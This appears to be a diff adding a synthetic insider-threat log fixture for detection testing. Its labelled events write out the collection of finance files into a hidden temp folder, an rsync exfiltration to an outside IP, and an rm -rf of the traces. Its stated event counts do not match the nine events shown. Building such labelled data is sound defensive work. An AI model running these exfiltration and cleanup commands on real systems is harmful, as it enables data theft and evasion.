@@ -1,0 +1,19 @@
+{
+  "scenario_name": "insider_threat",
+  "description": "Insider threat: unusual auth hours, mass file access, external data exfiltration via rsync",
+  "attack_techniques": ["T1078", "T1005", "T1048"],
+  "kill_chain_phases": ["initial_access", "collection", "exfiltration"],
+  "total_events": 30,
+  "attack_events": 10,
+  "events": [
+    {"@timestamp": "2026-03-02T02:30:00Z", "process.name": "sshd", "user.name": "jsmith", "source.ip": "192.168.1.50", "host.hostname": "fileserver01", "event.action": "authentication_success", "is_attack": true, "attack_technique": "T1078", "attack_phase": "initial_access"},
+    {"@timestamp": "2026-03-02T02:31:00Z", "process.name": "bash", "process.parent.name": "sshd", "user.name": "jsmith", "host.hostname": "fileserver01", "process.command_line": "find /data/finance -type f -name '*.xlsx'", "event.action": "process_started", "is_attack": true, "attack_technique": "T1005", "attack_phase": "collection"},
+    {"@timestamp": "2026-03-02T02:32:00Z", "process.name": "cp", "process.parent.name": "bash", "user.name": "jsmith", "host.hostname": "fileserver01", "process.command_line": "cp -r /data/finance/Q4_reports /tmp/.cache", "event.action": "process_started", "is_attack": true, "attack_technique": "T1005", "attack_phase": "collection"},
+    {"@timestamp": "2026-03-02T02:33:00Z", "process.name": "tar", "process.parent.name": "bash", "user.name": "jsmith", "host.hostname": "fileserver01", "process.command_line": "tar czf /tmp/.cache/reports.tar.gz /tmp/.cache/Q4_reports", "event.action": "process_started", "is_attack": true, "attack_technique": "T1005", "attack_phase": "collection"},
+    {"@timestamp": "2026-03-02T02:35:00Z", "process.name": "rsync", "process.parent.name": "bash", "user.name": "jsmith", "host.hostname": "fileserver01", "destination.ip": "203.0.113.50", "process.command_line": "rsync -avz /tmp/.cache/reports.tar.gz user@203.0.113.50:/incoming/", "event.action": "process_started", "is_attack": true, "attack_technique": "T1048", "attack_phase": "exfiltration"},
+    {"@timestamp": "2026-03-02T02:36:00Z", "process.name": "rm", "process.parent.name": "bash", "user.name": "jsmith", "host.hostname": "fileserver01", "process.command_line": "rm -rf /tmp/.cache", "event.action": "process_started", "is_attack": true, "attack_technique": "T1070.004", "attack_phase": "defense_evasion"},
+    {"@timestamp": "2026-03-02T02:30:30Z", "process.name": "systemd-logind", "user.name": "root", "host.hostname": "fileserver01", "event.action": "session_opened", "is_attack": false, "attack_technique": null, "attack_phase": null},
+    {"@timestamp": "2026-03-02T02:31:30Z", "process.name": "crond", "user.name": "root", "host.hostname": "fileserver01", "event.action": "process_started", "is_attack": false, "attack_technique": null, "attack_phase": null},
+    {"@timestamp": "2026-03-02T02:34:00Z", "process.name": "updatedb", "user.name": "root", "host.hostname": "fileserver01", "event.action": "process_started", "is_attack": false, "attack_technique": null, "attack_phase": null}
+  ]
+}
